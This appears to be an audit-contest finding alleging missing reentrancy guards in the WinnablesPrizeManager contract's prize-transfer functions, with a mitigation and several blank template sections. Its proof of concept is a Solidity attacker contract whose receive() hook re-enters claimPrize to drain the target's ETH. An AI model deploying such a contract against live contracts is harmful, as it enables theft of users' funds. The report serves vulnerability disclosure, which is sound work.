# Multiple Reentrancy Vulnerabilities at WinnablesPrizeManager contract

### Summary

Functions like _sendETHPrize, _sendTokenPrize, and _sendNFTPrize make external calls to transfer ETH, ERC20 tokens, or NFTs to a winner without implementing any reentrancy guards. If an attacker gains control over the winner address, they could potentially re-enter the contract and exploit the state before it is updated.

### Root Cause

 reentrancy guards missing.

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

This could allow an attacker to drain the contract's funds or manipulate the contract state in an unintended manner.

### PoC

 Malicious Contract
This contract will attempt to exploit the sendETHPrize function by reentering the claimPrize function to drain all ETH from the WinnablesPrizeManager contract.

```solidity
pragma solidity 0.8.24;

import "./WinnablesPrizeManager.sol";

contract MaliciousContract {
    WinnablesPrizeManager public target;
    uint256 public raffleId;

    constructor(WinnablesPrizeManager _target, uint256 _raffleId) {
        target = _target;
        raffleId = _raffleId;
    }

    // Fallback function will be triggered during the ETH transfer and will reenter the claimPrize function
    receive() external payable {
        if (address(target).balance > 0) {
            target.claimPrize(raffleId); // Reentering the target contract
        }
    }

    // Attack function to start the reentrancy attack
    function attack() external {
        target.claimPrize(raffleId);
    }
}
```


### Mitigation

Use a nonReentrant modifier or implement reentrancy protection using state variables to ensure the function cannot be re-entered.
